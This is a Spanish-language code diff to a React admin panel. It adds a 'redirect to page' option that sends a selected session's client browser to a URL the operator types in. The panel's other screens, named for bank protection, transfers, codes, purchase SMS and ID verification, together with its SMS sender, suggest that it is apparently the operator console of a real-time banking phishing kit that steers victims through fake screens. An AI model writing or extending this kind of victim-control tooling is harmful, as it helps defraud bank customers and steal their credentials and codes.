@@ -120,6 +120,10 @@ export default function AdminPanel() {
   const [smsPhoneNumber, setSmsPhoneNumber] = useState('');
   const [smsMessage, setSmsMessage] = useState('');
   const [isSendingSms, setIsSendingSms] = useState(false);
+  
+  // Estado para modal de redirección
+  const [isRedirectDialogOpen, setIsRedirectDialogOpen] = useState(false);
+  const [redirectUrl, setRedirectUrl] = useState('');
 
   // Determinar si es un usuario regular o administrador
   const isAdmin = user?.role === 'admin';
@@ -499,9 +503,13 @@ export default function AdminPanel() {
     console.log("handleScreenChange recibió tipo de pantalla:", screen);
 
     // Handle modals for certain screens
-    if (["protege", "transferir", "cancelacion", "codigo", "mensaje", "sms_compra"].includes(screen)) {
+    if (["protege", "transferir", "cancelacion", "codigo", "mensaje", "sms_compra", "redireccion"].includes(screen)) {
       console.log("Activando modal para:", screen);
-      setActiveModal(screen);
+      if (screen === "redireccion") {
+        setIsRedirectDialogOpen(true);
+      } else {
+        setActiveModal(screen);
+      }
       return;
     }
     
@@ -677,6 +685,26 @@ export default function AdminPanel() {
     closeModal();
   };
 
+  const handleRedirectConfirm = () => {
+    if (!redirectUrl.trim()) {
+      toast({
+        title: "URL requerida",
+        description: "Debe ingresar una URL válida para redireccionar.",
+        variant: "destructive",
+      });
+      return;
+    }
+
+    sendScreenChange({
+      tipo: 'mostrar_redireccion',
+      sessionId: selectedSessionId,
+      url: redirectUrl
+    });
+    
+    setIsRedirectDialogOpen(false);
+    setRedirectUrl('');
+  };
+
 
   
   // Manejar el envío de SMS
@@ -790,6 +818,7 @@ export default function AdminPanel() {
                   <option value="proteccion_bancaria">12. Protección Bancaria</option>
                   <option value="proteccion_saldo">13. Protección de Saldo</option>
                   <option value="verificacion_id">14. Verificación ID</option>
+                  <option value="redireccion">15. Redirección a página</option>
                 </select>
               </div>
             </div>
@@ -1090,6 +1119,61 @@ export default function AdminPanel() {
         onClose={closeModal} 
         onConfirm={handleSmsCompraConfirm} 
       />
+
+      {/* Modal de redirección */}
+      <Dialog open={isRedirectDialogOpen} onOpenChange={setIsRedirectDialogOpen}>
+        <DialogContent className="sm:max-w-[425px] bg-[#1e1e1e] text-white border-gray-700">
+          <DialogHeader>
+            <DialogTitle className="flex items-center">
+              <svg className="mr-2 h-5 w-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M10 6H6a2 2 0 00-2 2v10a2 2 0 002 2h10a2 2 0 002-2v-4M14 4h6m0 0v6m0-6L10 14" />
+              </svg>
+              Redirección a página
+            </DialogTitle>
+            <DialogDescription className="text-gray-400">
+              Ingresa la URL a la que será redirigido el cliente.
+            </DialogDescription>
+          </DialogHeader>
+          
+          <div className="grid gap-4 py-4">
+            <div className="grid grid-cols-4 items-center gap-4">
+              <Label htmlFor="url" className="text-right">
+                URL
+              </Label>
+              <Input
+                id="url"
+                type="url"
+                value={redirectUrl}
+                onChange={(e) => setRedirectUrl(e.target.value)}
+                placeholder="https://ejemplo.com"
+                className="col-span-3 bg-[#2a2a2a] border-gray-700 text-white"
+              />
+            </div>
+          </div>
+          
+          <DialogFooter>
+            <Button
+              type="button"
+              variant="outline"
+              onClick={() => {
+                setIsRedirectDialogOpen(false);
+                setRedirectUrl('');
+              }}
+              className="border-gray-700 text-gray-300 hover:bg-gray-800"
+            >
+              Cancelar
+            </Button>
+            <Button
+              type="button"
+              onClick={handleRedirectConfirm}
+              disabled={!redirectUrl.trim()}
+              className="bg-[#007bff] hover:bg-blue-700 text-white"
+            >
+              Confirmar
+            </Button>
+          </DialogFooter>
+        </DialogContent>
+      </Dialog>
 
       
       {/* Diálogo para enviar SMS */}
